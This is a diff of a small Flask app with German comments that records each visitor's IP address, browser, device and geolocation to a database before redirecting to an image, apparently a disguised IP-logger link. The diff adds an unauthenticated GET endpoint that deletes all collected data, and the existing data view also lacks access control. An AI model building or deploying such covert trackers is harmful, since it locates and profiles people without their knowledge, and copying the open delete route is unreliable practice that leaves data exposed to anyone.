@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, redirect, send_file
+from flask import Flask, request, jsonify, redirect
 import sqlite3
 import requests
 from datetime import datetime
@@ -69,7 +69,7 @@ def parse_user_agent(user_agent):
     
     return platform, browser, device_type
 
-# --- HAUPTROUTE: Trackt und leitet zum Bild weiter ---
+# --- Hauptroute: Trackt und leitet zum Bild weiter ---
 @app.route('/')
 def track_and_redirect():
     # 1. IP-Adresse ermitteln
@@ -103,11 +103,10 @@ def track_and_redirect():
     conn.commit()
     conn.close()
     
-    # 5. WEITERLEITUNG ZUM BILD
-    # Dein Bild-URL:
+    # 5. Weiterleitung zum Bild
     return redirect('https://i.postimg.cc/9MWQhv5r/ograda.jpg', 302)
 
-# --- Daten anzeigen (für Admin) ---
+# --- Daten anzeigen ---
 @app.route('/data')
 def view_data():
     conn = sqlite3.connect('database.db')
@@ -116,7 +115,6 @@ def view_data():
     rows = c.fetchall()
     conn.close()
     
-    # Spaltennamen für bessere Lesbarkeit
     columns = ['id', 'ip_address', 'user_agent', 'platform', 'browser', 
               'device_type', 'city', 'region', 'country', 'latitude', 
               'longitude', 'timestamp']
@@ -126,6 +124,33 @@ def view_data():
         result.append(dict(zip(columns, row)))
     
     return jsonify(result)
+
+# --- Daten zurücksetzen (OHNE Token - ACHTUNG!) ---
+@app.route('/resetdata', methods=['GET'])
+def reset_data():
+    try:
+        conn = sqlite3.connect('database.db')
+        c = conn.cursor()
+        
+        # NUR Daten löschen, Tabelle bleibt erhalten
+        c.execute('DELETE FROM clicks')
+        
+        # Auto-Increment zurücksetzen (ID beginnt wieder bei 1)
+        c.execute("DELETE FROM sqlite_sequence WHERE name='clicks'")
+        
+        conn.commit()
+        conn.close()
+        
+        return jsonify({
+            'status': 'success',
+            'message': 'All data deleted successfully'
+        }), 200
+        
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'message': str(e)
+        }), 500
 
 # --- Start ---
 if __name__ == '__main__':
